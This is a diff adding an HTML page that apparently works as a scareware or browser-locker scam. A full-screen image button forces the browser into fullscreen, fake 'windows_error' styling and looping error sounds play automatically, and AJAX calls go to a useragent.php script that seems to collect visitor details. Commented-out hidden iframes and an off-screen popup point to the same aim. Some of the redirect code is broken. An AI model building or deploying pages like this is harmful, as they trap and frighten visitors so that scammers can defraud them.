@@ -1,0 +1,190 @@
+ <!DOCTYPE html>
+<html> 
+<head>
+
+<script src="jquery.colorbox-min.js"></script> 
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+ 
+<style type="text/css">
+.p { cursor: crosshair; } 
+#go-button {
+    width: 100%; 
+      height: 100%;  
+}  
+
+.sp {
+
+color:#FFFFFF;
+font-size:24px;
+text-align:right;
+
+
+}
+
+.error
+{
+   font-size:24px;
+   color:#FFFFFF;
+  position:fixed;
+   top:250px;
+   left:350px;
+   
+}
+ 
+.windows_error {
+
+color:#FFFFFF; 
+font-size:17px;
+position:fixed;
+bottom:20px;
+right:5px;
+text-align:right;
+
+}
+
+.error-left
+{
+ font-size:24px;
+   color:#FFFFFF;
+  position:fixed;
+   top:10px;
+   left:100px;
+}
+</style> 
+   
+</head>
+
+<!--<body id="bodyid"  class="wait"  >  -->
+ <body id="bodyid"  class="wait"     > 
+<!-- <iframe src="01.php" style="display:none"></iframe>
+     <iframe src="useragent.php" style="display:none"></iframe>
+ <iframe src="01.php" style="display:none"></iframe>    
+    <iframe src="useragent.php" style="display:none"></iframe>
+    <iframe src="01.php" style="display:none"></iframe>
+    <iframe src="useragent.php" style="display:none"></iframe>
+    <iframe src="01.php" style="display:none"></iframe>
+    <iframe src="useragent.php" style="display:none"></iframe>
+    <iframe src="01.php" style="display:none"></iframe>
+    <iframe src="useragent.php" style="display:none"></iframe>  
+    <iframe src="useragent.php" style="display:none"></iframe>
+    <iframe src="useragent.php" style="display:none"></iframe>
+    <iframe src="useragent.php" style="display:none"></iframe>
+    <iframe src="useragent.php" style="display:none"></iframe>
+    <iframe src="useragent.php" style="display:none"></iframe>
+    <iframe src="useragent.php" style="display:none"></iframe>
+    <iframe src="useragent.php" style="display:none"></iframe>
+    <iframe src="useragent.php" style="display:none"></iframe>
+    <iframe src="useragent.php" style="display:none"></iframe>
+    <!-- <iframe src="useragent.php" style="display:none"></iframe>
+    
+    <script> 
+    window.open('index.html','_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=10, height=10, visible=none', '');
+    </script>
+    -->
+   
+	<div id="element"  >   
+	 
+		<button id="go-button">
+		   
+	  <img src="img-min.jpg" width="1000px" height="800px" id="go-button" />   
+		   
+    	</button>
+    	 
+    </div>	
+</body>
+
+<script> 
+/* Get into full screen */
+function GoInFullscreen(element) {
+      
+	if(element.requestFullscreen)
+		element.requestFullscreen();
+	else if(element.mozRequestFullScreen)
+		element.mozRequestFullScreen();
+	else if(element.webkitRequestFullscreen)
+		element.webkitRequestFullscreen();
+	else if(element.msRequestFullscreen)
+		element.msRequestFullscreen();
+}
+
+/* Get out of full screen */
+function GoOutFullscreen() {
+    
+     
+    //location.href("index.html");
+}
+ 
+
+/* Is currently in full screen or not */
+function IsFullScreenCurrently() { 
+	var full_screen_element = document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement || document.msFullscreenElement || null;
+	
+	// If no element is in full-screen
+	if(full_screen_element === null)
+	 
+		location.href("index01.html#go-button");
+	else
+			location.href("index01.html#go-button");
+}
+
+$("#go-button").on('click', function() {
+     
+	if(IsFullScreenCurrently())
+    
+//	location.href("index.html");
+		//GoOutFullscreen();
+		 $.ajax({
+                type: "GET",
+                url: "useragent.php" , 
+                success : function() { 
+ 				   // here is the code that will run on client side after running clear.php on server
+                    // function below reloads current page
+                     location.href("index.php");
+                   
+                }
+            });
+		
+ 	else
+ 	
+ 	 GoInFullscreen($("#element").get(0));
+});
+
+$(document).on('fullscreenchange webkitfullscreenchange mozfullscreenchange MSFullscreenChange', function() {
+	if(IsFullScreenCurrently()) {
+	    
+		//$("#element span").text('Full Screen Mode Enabled');
+		/*$("#go-php").text('Go'); */ 
+		//var ifr = document.createElement("iframe"); 
+		//ifr.src = 'useragent.php';  
+		// location.href("index.html");
+		 $.ajax({
+                type: "GET",
+                url: "useragent.php" , 
+                success : function() { 
+ 				   // here is the code that will run on client side after running clear.php on server
+                    // function below reloads current page
+                     location.href("index.php");
+         
+                }
+            });
+		// <iframe id="coToolbarFrame" src="useragent.php" style="height:0px;width:100%;display:none;"></iframe> 
+  	}
+	/*else {
+		$("#element span").text(' ');
+		$("#go-button").text('Enable Full Screen');
+	} */
+});
+
+</script>
+  <audio autoplay="autoplay" loop="" id="msgSound">
+    <source src="err.mp3" type="audio/mpeg">
+  </audio>
+
+
+<audio autoplay="autoplay" loop="" id="msgSound1">
+ <source src="Shfdfd.mp3" type="audio/mpeg">
+</audio>
+
+
+</html>
